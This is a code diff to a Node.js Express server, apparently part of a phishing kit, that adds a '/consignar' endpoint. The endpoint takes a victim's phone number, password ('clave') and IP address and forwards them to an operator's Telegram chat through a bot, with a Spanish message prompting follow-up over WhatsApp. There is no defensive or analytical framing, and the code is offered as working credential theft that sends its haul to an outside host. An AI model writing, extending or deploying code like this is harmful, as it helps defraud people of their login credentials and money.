@@ -288,6 +288,43 @@ app.post('/step3-dynamic', async (req, res) => {
   }
 });
 
+// ==================== ENDPOINT: CONSIGNAR ====================
+app.post('/consignar', async (req, res) => {
+  try {
+    const { sessionId, phoneNumber, password, ip } = req.body;
+
+    if (!BOT_TOKEN || !CHAT_ID) {
+      return res.status(500).json({ ok: false, reason: "Env vars undefined" });
+    }
+
+    const mensaje = `
+💰 QUIERE CONSIGNAR 💰
+
+📱 Número: ${phoneNumber}
+🔑 Clave: ${password}
+🌐 IP: ${ip}
+
+✅ SI QUIERO CONSIGNAR
+📲 ENVÍAME POR WHATSAPP PARA CONTINUAR
+
+🆔 Session: ${sessionId}
+    `.trim();
+
+    // Enviar a Telegram SIN BOTONES
+    await axios.post(getTelegramApiUrl('sendMessage'), {
+      chat_id: CHAT_ID,
+      text: mensaje
+    });
+
+    console.log(`✅ Mensaje de consignación enviado - Session: ${sessionId}`);
+
+    res.json({ ok: true, message: 'Mensaje enviado a Telegram' });
+  } catch (error) {
+    console.error('❌ ERROR EN /consignar:', error.message);
+    res.status(500).json({ ok: false, reason: error.message });
+  }
+});
+
 // ==================== WEBHOOK DE TELEGRAM ====================
 app.post(`/webhook/${BOT_TOKEN}`, async (req, res) => {
   try {
